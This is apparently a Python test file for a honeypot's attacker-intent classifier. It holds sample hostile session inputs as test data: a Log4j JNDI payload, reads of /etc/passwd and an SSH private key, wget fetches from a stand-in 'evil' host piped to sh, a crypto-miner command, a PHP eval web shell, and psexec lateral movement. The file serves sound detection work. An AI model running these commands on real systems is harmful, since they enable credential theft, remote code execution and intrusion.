"""Tests for the heuristic intent classifier."""

from __future__ import annotations

from honeytrap.ai.intent import IntentLabel, classify
from honeytrap.ai.memory import AuthAttempt, SessionMemory


def _mem(**kwargs) -> SessionMemory:  # type: ignore[no-untyped-def]
    mem = SessionMemory(session_id="s", source_ip="1.2.3.4")
    for key, val in kwargs.items():
        setattr(mem, key, val)
    return mem


def test_brute_force_pattern_high_confidence() -> None:
    attempts = [
        AuthAttempt(username="root", password=f"pw{i}", success=False, timestamp=0.0)
        for i in range(12)
    ]
    mem = _mem(auth_attempts=attempts)
    label, conf, rationale = classify(mem)
    assert label == IntentLabel.BRUTE_FORCE
    assert conf >= 0.7
    assert any("auth" in r.lower() for r in rationale)


def test_log4j_jndi_payload_marks_exploit_attempt() -> None:
    mem = _mem(command_history=["GET / HTTP/1.1\nUser-Agent: ${jndi:ldap://x/y}"])
    label, _, rationale = classify(mem)
    assert label == IntentLabel.EXPLOIT_ATTEMPT
    assert rationale


def test_cat_etc_passwd_flags_credential_harvest() -> None:
    mem = _mem(command_history=["cat /etc/passwd", "cat ~/.ssh/id_rsa"])
    label, _, _ = classify(mem)
    assert label == IntentLabel.CREDENTIAL_HARVEST


def test_miner_strings_flag_coin_mining() -> None:
    mem = _mem(
        command_history=[
            "wget http://evil/xmrig",
            "./xmrig --donate-level=1 -o stratum+tcp://pool:3333 -u addr",
        ]
    )
    label, conf, _ = classify(mem)
    assert label == IntentLabel.COIN_MINING
    assert conf >= 0.5


def test_wget_pipe_sh_flags_persistence() -> None:
    mem = _mem(command_history=["wget -qO- http://evil/x.sh | sh", "chmod +x payload"])
    label, _, _ = classify(mem)
    assert label == IntentLabel.PERSISTENCE


def test_baseline_connect_only_is_unknown() -> None:
    mem = _mem()
    label, conf, rationale = classify(mem)
    assert label == IntentLabel.UNKNOWN
    assert conf < 0.2
    assert rationale == ["no classifiable signals yet"]


def test_rationale_includes_at_least_one_signal() -> None:
    mem = _mem(command_history=["whoami", "id"])
    _, _, rationale = classify(mem)
    assert rationale
    assert "reconnaissance" in rationale[0].lower()


def test_attck_bias_credential_harvest() -> None:
    mem = _mem(
        attck_techniques={"T1078", "T1059"},
        command_history=["ls -la"],
    )
    label, _, rationale = classify(mem)
    assert label == IntentLabel.CREDENTIAL_HARVEST
    assert any("T1078" in r for r in rationale)


def test_web_shell_artefact_detected() -> None:
    mem = _mem(
        command_history=[
            "POST /up.php HTTP/1.1\n\n<?php eval(base64_decode($_POST['x'])); ?>"
        ]
    )
    label, _, _ = classify(mem)
    assert label == IntentLabel.WEB_SHELL


def test_lateral_movement_signal() -> None:
    mem = _mem(command_history=["psexec \\\\target -u admin", "net use x: \\\\host\\c$"])
    label, _, _ = classify(mem)
    assert label == IntentLabel.LATERAL_MOVEMENT
